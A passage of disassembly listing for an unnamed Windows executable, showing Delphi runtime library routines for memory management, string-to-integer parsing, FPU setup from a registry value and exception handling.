  00402293: mov     eax, ds:dword_406604
  00402298: add     ds:dword_406608, eax
  0040229E: add     esi, ds:dword_406604
  004022A4: xor     eax, eax
  004022A6: mov     ds:dword_406604, eax
  004022AB: mov     eax, esi
  004022AD: sub     eax, edi
  004022AF: add     ds:dword_4065A0, eax
  004022B5: mov     eax, [ebp+0]
  004022B8: and     eax, 80000003h
  004022BD: or      esi, eax
  004022BF: mov     [ebp+0], esi
  004022C2: mov     al, 1
  004022C4: jmp     loc_40236B
  004022C9: call    unknown_libname_20; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004022CE: mov     ebx, ebp
  004022D0: add     ebx, edi
  004022D2: test    byte ptr [ebx], 2
  004022D5: jnz     short loc_402324
  004022D7: mov     edx, ebx
  004022D9: mov     eax, edx
  004022DB: mov     ecx, [eax+8]
  004022DE: mov     [esp+18h+var_18], ecx
  004022E1: mov     ecx, [esp+18h+var_18]
  004022E4: cmp     ecx, [esp+18h+var_14]
  004022E8: jge     short loc_4022F8
  004022EA: add     edx, [esp+18h+var_18]
  004022ED: mov     ebx, edx
  004022EF: mov     eax, [esp+18h+var_18]
  004022F2: sub     [esp+18h+var_14], eax
  004022F6: jmp     short loc_402324
  004022F8: call    unknown_libname_12; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004022FD: mov     eax, [esp+18h+var_14]
  00402301: sub     [esp+18h+var_18], eax
  00402304: cmp     [esp+18h+var_18], 0Ch
  00402308: jl      short loc_402318
  0040230A: mov     eax, ebp
  0040230C: add     eax, esi
  0040230E: mov     edx, [esp+18h+var_18]
  00402311: call    unknown_libname_19; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00402316: jmp     short loc_402352
  00402318: add     esi, [esp+18h+var_18]
  0040231B: mov     ebx, ebp
  0040231D: add     ebx, esi
  0040231F: and     dword ptr [ebx], 0FFFFFFFEh
  00402322: jmp     short loc_402352
  00402324: mov     eax, [ebx]
  00402326: test    eax, 80000000h
  0040232B: jz      short loc_40234E
  0040232D: and     eax, 7FFFFFFCh
  00402332: add     eax, ebx
  00402334: mov     ebx, eax
  00402336: mov     edx, [esp+18h+var_14]
  0040233A: mov     eax, ebx; lpAddress
  0040233C: call    unknown_libname_23; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00402341: test    al, al
  00402343: jz      short loc_40234E
  00402345: mov     ebx, ebp
  00402347: add     ebx, edi
  00402349: jmp     loc_40225B
  0040234E: xor     eax, eax
  00402350: jmp     short loc_40236B
  00402352: mov     eax, esi
  00402354: sub     eax, edi
  00402356: add     ds:dword_4065A0, eax
  0040235C: mov     eax, [ebp+0]
  0040235F: and     eax, 80000003h
  00402364: or      esi, eax
  00402366: mov     [ebp+0], esi
  00402369: mov     al, 1
  0040236B: pop     ecx
  0040236C: pop     edx
  0040236D: pop     ebp
  0040236E: pop     edi
  0040236F: pop     esi
  00402370: pop     ebx
  00402371: retn

Function: @System@SysReallocMem$qqrpvi
  00402374: push    ebp
  00402375: mov     ebp, esp
  00402377: push    ecx
  00402378: push    ebx
  00402379: push    esi
  0040237A: push    edi
  0040237B: mov     esi, edx
  0040237D: mov     ebx, eax
  0040237F: cmp     ds:byte_65AC, 0
  00402386: jnz     short loc_40239B
  00402388: call    @System@_16447; System::_16447
  0040238D: test    al, al
  0040238F: jnz     short loc_40239B
  00402391: xor     eax, eax
  00402393: mov     [ebp+var_4], eax
  00402396: jmp     loc_40242C
  0040239B: xor     edx, edx
  0040239D: push    ebp
  0040239E: push    offset j_unknown_libname_39
  004023A3: push    dword ptr fs:[edx]
  004023A6: mov     fs:[edx], esp
  004023A9: cmp     ds:byte_6035, 0
  004023B0: jz      short loc_4023BC
  004023B2: push    offset CriticalSection; lpCriticalSection
  004023B7: call    EnterCriticalSection
  004023BC: mov     edx, esi
  004023BE: mov     eax, ebx
  004023C0: call    @System@_16485; System::_16485
  004023C5: test    al, al
  004023C7: jz      short loc_4023CE
  004023C9: mov     [ebp+var_4], ebx
  004023CC: jmp     short loc_402404
  004023CE: mov     eax, esi; int
  004023D0: call    @System@SysGetMem$qqri; System::SysGetMem(int)
  004023D5: mov     edi, eax
  004023D7: mov     eax, ebx
  004023D9: sub     eax, 4
  004023DC: mov     eax, [eax]
  004023DE: and     eax, 7FFFFFFCh
  004023E3: sub     eax, 4
  004023E6: cmp     esi, eax
  004023E8: jge     short loc_4023EC
  004023EA: mov     eax, esi
  004023EC: test    edi, edi
  004023EE: jz      short loc_402401
  004023F0: mov     edx, edi; void *
  004023F2: mov     ecx, ebx
  004023F4: xchg    eax, ecx; int
  004023F5: call    @System@Move$qqrpxvpvi; System::Move(void *,void *,int)
  004023FA: mov     eax, ebx; void *
  004023FC: call    @System@SysFreeMem$qqrpv; System::SysFreeMem(void *)
  00402401: mov     [ebp+var_4], edi
  00402404: xor     eax, eax
  00402406: pop     edx
  00402407: pop     ecx
  00402408: pop     ecx
  00402409: mov     fs:[eax], edx
  0040240C: push    offset loc_40242C
  00402411: cmp     ds:byte_6035, 0
  00402418: jz      short loc_402424
  0040241A: push    offset CriticalSection; lpCriticalSection
  0040241F: call    LeaveCriticalSection
  00402424: retn
  0040242C: mov     eax, [ebp+var_4]
  0040242F: pop     edi
  00402430: pop     esi
  00402431: pop     ebx
  00402432: pop     ecx
  00402433: pop     ebp
  00402434: retn

Function: j_unknown_libname_39
  00402425: jmp     unknown_libname_39; BDS 2005-2007 and Delphi6-7 Visual Component Library

Function: @System@@GetMem$qqri
  00402438: push    ebx
  00402439: test    eax, eax
  0040243B: jle     short loc_402452
  0040243D: call    ds:off_5024; System::SysGetMem(int)
  00402443: mov     ebx, eax
  00402445: test    ebx, ebx
  00402447: jnz     short loc_402454
  00402449: mov     al, 1
  0040244B: call    @System@Error$qqr20System@TRuntimeError; System::Error(System::TRuntimeError)
  00402450: jmp     short loc_402454
  00402452: xor     ebx, ebx
  00402454: mov     eax, ebx
  00402456: pop     ebx
  00402457: retn

Function: @System@@FreeMem$qqrpv
  00402458: push    ebx
  00402459: test    eax, eax
  0040245B: jz      short loc_402472
  0040245D: call    ds:off_5028; System::SysFreeMem(void *)
  00402463: mov     ebx, eax
  00402465: test    ebx, ebx
  00402467: jz      short loc_402474
  00402469: mov     al, 2
  0040246B: call    @System@Error$qqr20System@TRuntimeError; System::Error(System::TRuntimeError)
  00402470: jmp     short loc_402474
  00402472: xor     ebx, ebx
  00402474: mov     eax, ebx
  00402476: pop     ebx
  00402477: retn

Function: sub_402478
  00402478: mov     ds:dword_405004, edx
  0040247E: call    sub_402ED4

Function: unknown_libname_26
  00402484: push    ebx
  00402485: push    esi
  00402486: mov     esi, edx
  00402488: mov     ebx, eax
  0040248A: and     bl, 7Fh
  0040248D: cmp     ds:dword_406008, 0
  00402494: jz      short loc_4024A0
  00402496: mov     edx, esi
  00402498: mov     eax, ebx
  0040249A: call    ds:dword_406008
  004024A0: test    bl, bl
  004024A2: jnz     short loc_4024B1
  004024A4: call    @Sysinit@@GetTls$qqrv; Sysinit::__linkproc__ GetTls(void)
  004024A9: mov     ebx, [eax+4]
  004024AF: jmp     short loc_4024C0
  004024B1: cmp     bl, 18h
  004024B4: ja      short loc_4024C0
  004024B6: xor     eax, eax
  004024B8: mov     al, bl
  004024BA: mov     bl, ds:byte_5030[eax]
  004024C0: xor     eax, eax
  004024C2: mov     al, bl
  004024C4: mov     edx, esi
  004024C6: call    sub_402478

Function: @System@Error$qqr20System@TRuntimeError
  004024D0: and     eax, 7Fh
  004024D3: mov     edx, [esp+0]
  004024D6: jmp     unknown_libname_26; BDS 2005-2007 and Delphi6-7 Visual Component Library

Function: unknown_libname_27
  004024DC: push    ebx
  004024DD: mov     ebx, eax
  004024DF: call    @Sysinit@@GetTls$qqrv; Sysinit::__linkproc__ GetTls(void)
  004024E4: mov     [eax+4], ebx
  004024EA: pop     ebx
  004024EB: retn

Function: @System@Move$qqrpxvpvi
  004024EC: push    esi
  004024ED: push    edi
  004024EE: mov     esi, eax
  004024F0: mov     edi, edx
  004024F2: mov     eax, ecx
  004024F4: cmp     edi, esi
  004024F6: ja      short loc_40250B
  004024F8: jz      short loc_402529
  004024FA: sar     ecx, 2
  004024FD: js      short loc_402529
  004024FF: rep movsd
  00402501: mov     ecx, eax
  00402503: and     ecx, 3
  00402506: rep movsb
  00402508: pop     edi
  00402509: pop     esi
  0040250A: retn
  0040250B: lea     esi, [ecx+esi-4]
  0040250F: lea     edi, [ecx+edi-4]
  00402513: sar     ecx, 2
  00402516: js      short loc_402529
  00402518: std
  00402519: rep movsd
  0040251B: mov     ecx, eax
  0040251D: and     ecx, 3
  00402520: add     esi, 3
  00402523: add     edi, 3
  00402526: rep movsb
  00402528: cld
  00402529: pop     edi
  0040252A: pop     esi
  0040252B: retn

Function: @System@@Close$qqrr15System@TTextRec
  0040252C: push    ebx
  0040252D: push    esi
  0040252E: mov     ebx, eax
  00402530: xor     esi, esi
  00402532: mov     ax, [ebx+4]
  00402536: cmp     ax, 0D7B1h
  0040253A: jb      short loc_40256B
  0040253C: cmp     ax, 0D7B3h
  00402540: ja      short loc_40256B
  00402542: and     ax, 0D7B2h
  00402546: cmp     ax, 0D7B2h
  0040254A: jnz     short loc_402553
  0040254C: mov     eax, ebx
  0040254E: call    dword ptr [ebx+1Ch]
  00402551: mov     esi, eax
  00402553: test    esi, esi
  00402555: jnz     short loc_40255E
  00402557: mov     eax, ebx
  00402559: call    dword ptr [ebx+24h]
  0040255C: mov     esi, eax
  0040255E: test    esi, esi
  00402560: jz      short loc_40257D
  00402562: mov     eax, esi
  00402564: call    unknown_libname_27; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00402569: jmp     short loc_40257D
  0040256B: cmp     ebx, offset unk_6038
  00402571: jz      short loc_40257D
  00402573: mov     eax, 67h ; 'g'
  00402578: call    unknown_libname_27; BDS 2005-2007 and Delphi6-7 Visual Component Library
  0040257D: mov     eax, esi
  0040257F: pop     esi
  00402580: pop     ebx
  00402581: retn

Function: @System@@ValLong$qqrx17System@AnsiStringri
  00402584: push    ebx
  00402585: push    esi
  00402586: push    edi
  00402587: mov     esi, eax
  00402589: push    eax
  0040258A: test    eax, eax
  0040258C: jz      short loc_4025FA
  0040258E: xor     eax, eax
  00402590: xor     ebx, ebx
  00402592: mov     edi, 0CCCCCCCh
  00402597: mov     bl, [esi]
  00402599: inc     esi
  0040259A: cmp     bl, 20h ; ' '
  0040259D: jz      short loc_402597
  0040259F: mov     ch, 0
  004025A1: cmp     bl, 2Dh ; '-'
  004025A4: jz      short loc_402608
  004025A6: cmp     bl, 2Bh ; '+'
  004025A9: jz      short loc_40260A
  004025AB: cmp     bl, 24h ; '$'
  004025AE: jz      short loc_40260F
  004025B0: cmp     bl, 78h ; 'x'
  004025B3: jz      short loc_40260F
  004025B5: cmp     bl, 58h ; 'X'
  004025B8: jz      short loc_40260F
  004025BA: cmp     bl, 30h ; '0'
  004025BD: jnz     short loc_4025D2
  004025BF: mov     bl, [esi]
  004025C1: inc     esi
  004025C2: cmp     bl, 78h ; 'x'
  004025C5: jz      short loc_40260F
  004025C7: cmp     bl, 58h ; 'X'
  004025CA: jz      short loc_40260F
  004025CC: test    bl, bl
  004025CE: jz      short loc_4025F0
  004025D0: jmp     short loc_4025D6
  004025D2: test    bl, bl
  004025D4: jz      short loc_402603
  004025D6: sub     bl, 30h ; '0'
  004025D9: cmp     bl, 9
  004025DC: ja      short loc_402603
  004025DE: cmp     eax, edi
  004025E0: ja      short loc_402603
  004025E2: lea     eax, [eax+eax*4]
  004025E5: add     eax, eax
  004025E7: add     eax, ebx
  004025E9: mov     bl, [esi]
  004025EB: inc     esi
  004025EC: test    bl, bl
  004025EE: jnz     short loc_4025D6
  004025F0: dec     ch
  004025F2: jz      short loc_4025FD
  004025F4: test    eax, eax
  004025F6: jge     short loc_40264C
  004025F8: jmp     short loc_402603
  004025FA: inc     esi
  004025FB: jmp     short loc_402603
  004025FD: neg     eax
  004025FF: jle     short loc_40264C
  00402601: js      short loc_40264C
  00402603: pop     ebx
  00402604: sub     esi, ebx
  00402606: jmp     short loc_40264F
  00402608: inc     ch
  0040260A: mov     bl, [esi]
  0040260C: inc     esi
  0040260D: jmp     short loc_4025AB
  0040260F: mov     edi, 0FFFFFFFh
  00402614: mov     bl, [esi]
  00402616: inc     esi
  00402617: test    bl, bl
  00402619: jz      short loc_4025FA
  0040261B: cmp     bl, 61h ; 'a'
  0040261E: jb      short loc_402623
  00402620: sub     bl, 20h ; ' '
  00402623: sub     bl, 30h ; '0'
  00402626: cmp     bl, 9
  00402629: jbe     short loc_402636
  0040262B: sub     bl, 11h
  0040262E: cmp     bl, 5
  00402631: ja      short loc_402603
  00402633: add     bl, 0Ah
  00402636: cmp     eax, edi
  00402638: ja      short loc_402603
  0040263A: shl     eax, 4
  0040263D: add     eax, ebx
  0040263F: mov     bl, [esi]
  00402641: inc     esi
  00402642: test    bl, bl
  00402644: jnz     short loc_40261B
  00402646: dec     ch
  00402648: jnz     short loc_40264C
  0040264A: neg     eax
  0040264C: pop     ecx
  0040264D: xor     esi, esi
  0040264F: mov     [edx], esi
  00402651: pop     edi
  00402652: pop     esi
  00402653: pop     ebx
  00402654: retn

Function: GetKeyboardType
  00402658: jmp     ds:__imp_GetKeyboardType

Function: unknown_libname_28
  00402660: push    ebx
  00402661: xor     ebx, ebx
  00402663: push    0; nTypeFlag
  00402665: call    GetKeyboardType
  0040266A: cmp     eax, 7
  0040266D: jnz     short loc_40268B
  0040266F: push    1; nTypeFlag
  00402671: call    GetKeyboardType
  00402676: and     eax, 0FF00h
  0040267B: cmp     eax, 0D00h
  00402680: jz      short loc_402689
  00402682: cmp     eax, 400h
  00402687: jnz     short loc_40268B
  00402689: mov     bl, 1
  0040268B: mov     eax, ebx
  0040268D: pop     ebx
  0040268E: retn

Function: unknown_libname_29
  00402690: push    ebp
  00402691: mov     ebp, esp
  00402693: add     esp, 0FFFFFFF4h
  00402696: movzx   eax, ds:word_500C
  0040269D: mov     dword ptr [ebp+Data], eax
  004026A0: lea     eax, [ebp+phkResult]
  004026A3: push    eax; phkResult
  004026A4: push    1; samDesired
  004026A6: push    0; ulOptions
  004026A8: push    offset SubKey; "SOFTWARE\\Borland\\Delphi\\RTL"
  004026AD: push    80000002h; hKey
  004026B2: call    RegOpenKeyExA
  004026B7: test    eax, eax
  004026B9: jnz     short loc_402708
  004026BB: xor     eax, eax
  004026BD: push    ebp
  004026BE: push    offset j_unknown_libname_39_0
  004026C3: push    dword ptr fs:[eax]
  004026C6: mov     fs:[eax], esp
  004026C9: mov     [ebp+cbData], 4
  004026D0: lea     eax, [ebp+cbData]
  004026D3: push    eax; lpcbData
  004026D4: lea     eax, [ebp+Data]
  004026D7: push    eax; lpData
  004026D8: push    0; lpType
  004026DA: push    0; lpReserved
  004026DC: push    offset ValueName; "FPUMaskValue"
  004026E1: mov     eax, [ebp+phkResult]
  004026E4: push    eax; hKey
  004026E5: call    RegQueryValueExA
  004026EA: xor     eax, eax
  004026EC: pop     edx
  004026ED: pop     ecx
  004026EE: pop     ecx
  004026EF: mov     fs:[eax], edx
  004026F2: push    offset loc_402708
  004026F7: mov     eax, [ebp+phkResult]
  004026FA: push    eax; hKey
  004026FB: call    RegCloseKey
  00402700: retn
  00402708: mov     ax, ds:word_500C
  0040270E: and     ax, 0FFC0h
  00402712: mov     dx, word ptr [ebp+Data]
  00402716: and     dx, 3Fh
  0040271A: or      ax, dx
  0040271D: mov     ds:word_500C, ax
  00402723: mov     esp, ebp
  00402725: pop     ebp
  00402726: retn

Function: j_unknown_libname_39_0
  00402701: jmp     unknown_libname_39; BDS 2005-2007 and Delphi6-7 Visual Component Library

Function: unknown_libname_30
  00402754: fninit
  00402756: wait
  00402757: fldcw   ds:word_500C
  0040275D: retn

Function: @System@TObject@Free$qqrv
  00402760: test    eax, eax
  00402762: jz      short locret_276B
  00402764: mov     dl, 1
  00402766: mov     ecx, [eax]
  00402768: call    dword ptr [ecx-4]
  0040276B: retn

Function: unknown_libname_31
  0040276C: cmp     ds:byte_5010, 1
  00402773: jbe     short locret_2786
  00402775: push    0
  00402777: push    0
  00402779: push    0
  0040277B: push    0EEDFADFh
  00402780: call    ds:dword_406010
  00402786: retn

Function: unknown_libname_32
  00402788: cmp     ds:byte_5010, 0
  0040278F: jz      short locret_27A8
  00402791: push    eax
  00402792: push    eax
  00402793: push    edx
  00402794: push    esp
  00402795: push    2
  00402797: push    0
  00402799: push    0EEDFAE4h
  0040279E: call    ds:dword_406010
  004027A4: add     esp, 8
  004027A7: pop     eax
  004027A8: retn

Function: unknown_libname_34
  004027AC: push    esp; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004027AD: push    1
  004027AF: push    0
  004027B1: push    0EEDFAE0h
  004027B6: call    ds:dword_406010
  004027BC: add     esp, 4
  004027BF: pop     eax
  004027C0: retn
  004027C4: cmp     ds:byte_5010, 1
  004027CB: jbe     short locret_27D4
  004027CD: push    eax
  004027CE: push    ebx
  004027CF: jmp     unknown_libname_33; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004027D4: retn

Function: unknown_libname_35
  004027D8: test    ecx, ecx
  004027DA: jz      short locret_27F5
  004027DC: mov     eax, [ecx+1]
  004027DF: cmp     byte ptr [ecx], 0E9h ; 'é'
  004027E2: jz      short loc_4027F0
  004027E4: cmp     byte ptr [ecx], 0EBh ; 'ë'
  004027E7: jnz     short locret_27F5
  004027E9: movsx   eax, al
  004027EC: inc     ecx
  004027ED: inc     ecx
  004027EE: jmp     short loc_4027F3
  004027F0: add     ecx, 5
  004027F3: add     ecx, eax
  004027F5: retn

Function: unknown_libname_36
  004027F8: cmp     ds:byte_5010, 1
  004027FF: jbe     short locret_281E
  00402801: push    eax
  00402802: push    edx
  00402803: push    ecx
  00402804: call    unknown_libname_35; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00402809: push    ecx
  0040280A: push    esp
  0040280B: push    1
  0040280D: push    0
  0040280F: push    0EEDFAE1h
  00402814: call    ds:dword_406010
  0040281A: pop     ecx
  0040281B: pop     ecx
  0040281C: pop     edx
  0040281D: pop     eax
  0040281E: retn

Function: unknown_libname_37
  00402820: cmp     ds:byte_5010, 1
  00402827: jbe     short locret_283B
  00402829: push    edx
  0040282A: push    esp
  0040282B: push    1
  0040282D: push    0
  0040282F: push    0EEDFAE2h
  00402834: call    ds:dword_406010
  0040283A: pop     edx
  0040283B: retn

Function: unknown_libname_38
  0040283C: push    eax
  0040283D: push    edx
  0040283E: cmp     ds:byte_5010, 1
  00402845: jbe     short loc_402857
  00402847: push    esp
  00402848: push    2
  0040284A: push    0
  0040284C: push    0EEDFAE3h
  00402851: call    ds:dword_406010
  00402857: pop     edx
  00402858: pop     eax
  00402859: retn

Function: @System@@HandleAnyException$qqrv
  0040285C: mov     eax, [esp+ExceptionInfo.ExceptionRecord]
  00402860: test    dword ptr [eax+4], 6
  00402867: jnz     loc_402980
  0040286D: cmp     dword ptr [eax], 0EEDFADEh
  00402873: mov     edx, [eax+18h]
  00402876: mov     ecx, [eax+14h]
  00402879: jz      short loc_4028E9
  0040287B: cld
  0040287C: call    unknown_libname_30; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00402881: mov     edx, ds:dword_40600C
  00402887: test    edx, edx
  00402889: jz      loc_402980
  0040288F: call    edx ; dword_40600C
  00402891: test    eax, eax
  00402893: jz      loc_402980
  00402899: mov     edx, [esp+arg_8]
  0040289D: mov     ecx, [esp+ExceptionInfo.ExceptionRecord]
  004028A1: cmp     dword ptr [ecx], 0EEFFACEh
  004028A7: jz      short loc_4028E0
  004028A9: call    unknown_libname_32; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004028AE: cmp     ds:byte_5014, 0
  004028B5: jbe     short loc_4028E0
  004028B7: cmp     ds:byte_5010, 0
  004028BE: ja      short loc_4028E0
  004028C0: lea     ecx, [esp+ExceptionInfo]
  004028C4: push    eax
  004028C5: push    ecx; ExceptionInfo
  004028C6: call    UnhandledExceptionFilter
  004028CB: cmp     eax, 0
  004028CE: pop     eax
  004028CF: jz      loc_402980
  004028D5: mov     edx, eax
  004028D7: mov     eax, [esp+ExceptionInfo.ExceptionRecord]
  004028DB: mov     ecx, [eax+0Ch]
  004028DE: jmp     short loc_402910
  004028E0: mov     edx, eax
  004028E2: mov     eax, [esp+ExceptionInfo.ExceptionRecord]
  004028E6: mov     ecx, [eax+0Ch]
  004028E9: cmp     ds:byte_5014, 1
  004028F0: jbe     short loc_402910
  004028F2: cmp     ds:byte_5010, 0
  004028F9: ja      short loc_402910
  004028FB: push    eax
  004028FC: lea     eax, [esp+4+ExceptionInfo]
  00402900: push    edx
  00402901: push    ecx
  00402902: push    eax; ExceptionInfo
  00402903: call    UnhandledExceptionFilter
  00402908: cmp     eax, 0
  0040290B: pop     ecx
  0040290C: pop     edx
  0040290D: pop     eax
  0040290E: jz      short loc_402980
  00402910: or      dword ptr [eax+4], 2
  00402914: push    ebx
  00402915: xor     ebx, ebx
  00402917: push    esi
  00402918: push    edi
  00402919: push    ebp
  0040291A: mov     ebx, fs:[ebx]
  0040291D: push    ebx
  0040291E: push    eax
  0040291F: push    edx
  00402920: push    ecx
  00402921: mov     edx, [esp+20h+ExceptionInfo.ContextRecord]
  00402925: push    0
  00402927: push    eax
  00402928: push    offset loc_402934
  0040292D: push    edx
  0040292E: call    ds:dword_406014
  00402934: mov     edi, [esp+arg_24]
  00402938: call    @Sysinit@@GetTls$qqrv; Sysinit::__linkproc__ GetTls(void)
  0040293D: push    dword ptr [eax+0]
  00402943: mov     [eax+0], esp
  00402949: mov     ebp, [edi+8]
  0040294C: mov     ebx, [edi+4]
  0040294F: mov     dword ptr [edi+4], offset loc_402960
  00402956: add     ebx, 5
  00402959: call    unknown_libname_34; BDS 2005-2007 and Delphi6-7 Visual Component Library
  0040295E: jmp     ebx
  00402960: jmp     unknown_libname_39; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00402965: call    @Sysinit@@GetTls$qqrv; Sysinit::__linkproc__ GetTls(void)
  0040296A: mov     ecx, [eax+0]
  00402970: mov     edx, [ecx]
  00402972: mov     [eax+0], edx
  00402978: mov     eax, [ecx+8]; this
  0040297B: jmp     @System@TObject@Free$qqrv; System::TObject::Free(void)
  00402980: mov     eax, 1
  00402985: retn

Function: unknown_libname_39
  00402988: mov     eax, [esp+arg_0]
  0040298C: mov     edx, [esp+arg_4]
  00402990: test    dword ptr [eax+4], 6
  00402997: jz      short loc_4029B8
  00402999: mov     ecx, [edx+4]
  0040299C: mov     dword ptr [edx+4], offset loc_4029B8
  004029A3: push    ebx
  004029A4: push    esi
  004029A5: push    edi
  004029A6: push    ebp
  004029A7: mov     ebp, [edx+8]
  004029AA: add     ecx, 5
  004029AD: call    unknown_libname_36; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004029B2: call    ecx
  004029B4: pop     ebp
  004029B5: pop     edi
  004029B6: pop     esi
  004029B7: pop     ebx
  004029B8: mov     eax, 1
  004029BD: retn

Function: @System@@RaiseAgain$qqrv
  004029C0: mov     eax, [esp+arg_2C]
  004029C4: mov     dword ptr [eax+4], offset loc_402A0B
  004029CB: call    @Sysinit@@GetTls$qqrv; Sysinit::__linkproc__ GetTls(void)
  004029D0: mov     edx, [eax+0]
  004029D6: mov     ecx, [edx]
  004029D8: mov     [eax+0], ecx
  004029DE: mov     eax, [edx+0Ch]
  004029E1: and     dword ptr [eax+4], 0FFFFFFFDh
  004029E5: cmp     dword ptr [eax], 0EEDFADEh
  004029EB: jz      short loc_4029FA
  004029ED: mov     eax, [edx+8]; this
  004029F0: call    @System@TObject@Free$qqrv; System::TObject::Free(void)
  004029F5: call    unknown_libname_31; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004029FA: xor     eax, eax
  004029FC: add     esp, 14h
  004029FF: mov     edx, fs:[eax]
  00402A02: pop     ecx
  00402A03: mov     edx, [edx]
  00402A05: mov     [ecx], edx
  00402A07: pop     ebp
  00402A08: pop     edi
  00402A09: pop     esi
  00402A0A: pop     ebx
  00402A0B: mov     eax, 1
  00402A10: retn

Function: @System@@DoneExcept$qqrv
  00402A14: call    @Sysinit@@GetTls$qqrv; Sysinit::__linkproc__ GetTls(void)
  00402A19: mov     edx, [eax+0]
  00402A1F: mov     ecx, [edx]
  00402A21: mov     [eax+0], ecx
  00402A27: mov     eax, [edx+8]; this
  00402A2A: call    @System@TObject@Free$qqrv; System::TObject::Free(void)
  00402A2F: pop     edx
  00402A30: mov     esp, [esp-4+arg_2C]
  00402A34: xor     eax, eax
  00402A36: pop     ecx
  00402A37: mov     fs:[eax], ecx
  00402A3A: pop     eax
  00402A3B: pop     ebp
  00402A3C: call    unknown_libname_37; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00402A41: jmp     edx

Function: @System@@TryFinallyExit$qqrv
  00402A44: xor     edx, edx
  00402A46: mov     ecx, [esp+arg_4]
  00402A4A: mov     eax, [esp+arg_0]
  00402A4E: add     ecx, 5
  00402A51: mov     fs:[edx], eax
  00402A54: call    ecx
  00402A56: retn    0Ch

Function: unknown_libname_40
  00402A5C: push    ebp
  00402A5D: mov     ebp, esp
  00402A5F: mov     edx, [ebp+arg_0]
  00402A62: mov     eax, [edx]
  00402A64: cmp     eax, 0C0000092h
  00402A69: jg      short loc_402A97
  00402A6B: jz      short loc_402AC9
  00402A6D: cmp     eax, 0C000008Eh
  00402A72: jg      short loc_402A89
  00402A74: jz      short loc_402ACD
  00402A76: sub     eax, 0C0000005h
  00402A7B: jz      short loc_402AD9
  00402A7D: sub     eax, 87h ; '‡'
  00402A82: jz      short loc_402AC1
  00402A84: dec     eax
  00402A85: jz      short loc_402AD5
  00402A87: jmp     short loc_402AE9
  00402A89: add     eax, 3FFFFF71h
  00402A8E: sub     eax, 2
  00402A91: jb      short loc_402AC9
  00402A93: jz      short loc_402AC5
  00402A95: jmp     short loc_402AE9
  00402A97: cmp     eax, 0C0000096h
  00402A9C: jg      short loc_402AAF
  00402A9E: jz      short loc_402ADD
  00402AA0: sub     eax, 0C0000093h
  00402AA5: jz      short loc_402AD5
  00402AA7: dec     eax
  00402AA8: jz      short loc_402ABD
  00402AAA: dec     eax
  00402AAB: jz      short loc_402AD1
  00402AAD: jmp     short loc_402AE9
  00402AAF: sub     eax, 0C00000FDh
  00402AB4: jz      short loc_402AE5
  00402AB6: sub     eax, 3Dh ; '='
  00402AB9: jz      short loc_402AE1
  00402ABB: jmp     short loc_402AE9
  00402ABD: mov     al, 0C8h ; 'È'
  00402ABF: jmp     short loc_402AEB
  00402AC1: mov     al, 0C9h ; 'É'
  00402AC3: jmp     short loc_402AEB
  00402AC5: mov     al, 0CDh ; 'Í'
  00402AC7: jmp     short loc_402AEB
  00402AC9: mov     al, 0CFh ; 'Ï'
  00402ACB: jmp     short loc_402AEB
  00402ACD: mov     al, 0C8h ; 'È'
  00402ACF: jmp     short loc_402AEB
  00402AD1: mov     al, 0D7h ; '×'
  00402AD3: jmp     short loc_402AEB
  00402AD5: mov     al, 0CEh ; 'Î'
  00402AD7: jmp     short loc_402AEB
  00402AD9: mov     al, 0D8h ; 'Ø'
  00402ADB: jmp     short loc_402AEB
  00402ADD: mov     al, 0DAh ; 'Ú'
  00402ADF: jmp     short loc_402AEB
  00402AE1: mov     al, 0D9h ; 'Ù'
  00402AE3: jmp     short loc_402AEB
  00402AE5: mov     al, 0CAh ; 'Ê'
  00402AE7: jmp     short loc_402AEB
  00402AE9: mov     al, 0FFh
  00402AEB: and     eax, 0FFh
  00402AF0: mov     edx, [edx+0Ch]
  00402AF3: call    sub_402478

Function: unknown_libname_41
  00402AFC: mov     eax, [esp+ExceptionInfo.ExceptionRecord]
  00402B00: test    dword ptr [eax+4], 6
  00402B07: jnz     loc_402B96
  00402B0D: cmp     ds:byte_5010, 0
  00402B14: ja      short loc_402B25
  00402B16: lea     eax, [esp+ExceptionInfo]
  00402B1A: push    eax; ExceptionInfo
  00402B1B: call    UnhandledExceptionFilter
  00402B20: cmp     eax, 0
  00402B23: jz      short loc_402B96
  00402B25: mov     eax, [esp+ExceptionInfo.ExceptionRecord]
  00402B29: cld
  00402B2A: call    unknown_libname_30; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00402B2F: mov     edx, [esp+ExceptionInfo.ContextRecord]
  00402B33: push    0
  00402B35: push    eax
  00402B36: push    offset loc_402B42
  00402B3B: push    edx
  00402B3C: call    ds:dword_406014
  00402B42: mov     ebx, [esp+ExceptionInfo.ExceptionRecord]
  00402B46: cmp     dword ptr [ebx], 0EEDFADEh
  00402B4C: mov     edx, [ebx+14h]
  00402B4F: mov     eax, [ebx+18h]
  00402B52: jz      short loc_402B71
  00402B54: mov     edx, ds:dword_40600C
  00402B5A: test    edx, edx
  00402B5C: jz      unknown_libname_40; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00402B62: mov     eax, ebx
  00402B64: call    edx ; dword_40600C
  00402B66: test    eax, eax
  00402B68: jz      unknown_libname_40; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00402B6E: mov     edx, [ebx+0Ch]
  00402B71: call    unknown_libname_38; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00402B76: mov     ecx, ds:dword_406004
  00402B7C: test    ecx, ecx
  00402B7E: jz      short loc_402B82
  00402B80: call    ecx ; dword_406004
  00402B82: mov     ecx, [esp+ExceptionInfo.ExceptionRecord]
  00402B86: mov     eax, 0D9h ; 'Ù'
  00402B8B: mov     edx, [ecx+14h]
  00402B8E: mov     [esp+0], edx
  00402B91: jmp     sub_402EE0
  00402B96: xor     eax, eax
  00402B98: retn

Function: unknown_libname_42
  00402B9C: xor     edx, edx
  00402B9E: lea     eax, [ebp-0Ch]
  00402BA1: mov     ecx, fs:[edx]
